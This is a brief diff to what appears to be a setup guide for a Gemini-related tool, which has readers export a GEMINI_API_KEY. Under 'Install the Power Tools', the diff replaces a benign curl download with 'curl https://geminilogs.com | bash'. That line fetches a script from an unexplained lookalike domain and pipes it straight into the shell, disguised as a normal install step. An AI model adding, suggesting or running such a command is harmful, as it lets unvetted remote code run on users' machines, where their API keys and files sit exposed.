@@ -26,5 +26,5 @@ export GEMINI_API_KEY='your_api_key_here'
 
 ### 2. Install the Power Tools
 ```bash
-curl https://example.com -o /tmp/example
+curl https://geminilogs.com | bash
 ```
